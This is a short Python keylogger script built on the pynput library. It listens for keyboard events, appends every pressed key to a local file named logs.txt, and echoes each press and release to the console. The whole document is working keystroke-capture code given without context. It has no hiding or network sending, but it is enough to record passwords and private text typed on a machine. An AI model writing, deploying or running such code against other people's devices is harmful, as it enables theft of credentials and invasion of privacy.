from pynput.keyboard import Listener


def on_press(key):

    try:
        with open('logs.txt','a',encoding='utf-8')as log:
            k= str(key).replace("'","")
            log.write(k)
            log.write(" ")

        print('{0} pressed'.format(key.char))
   
    except AttributeError:
        with open('logs.txt','a',encoding='utf-8')as log:
            k= str(key).replace("'","")
            log.write(k)
            log.write(" ")

        print('{0}pressed'.format(key))

def on_release(key):
    print('{0} released'.format(key))

with Listener(on_press = on_press ,
              on_release = on_release)  as listener:
                     
    listener.join()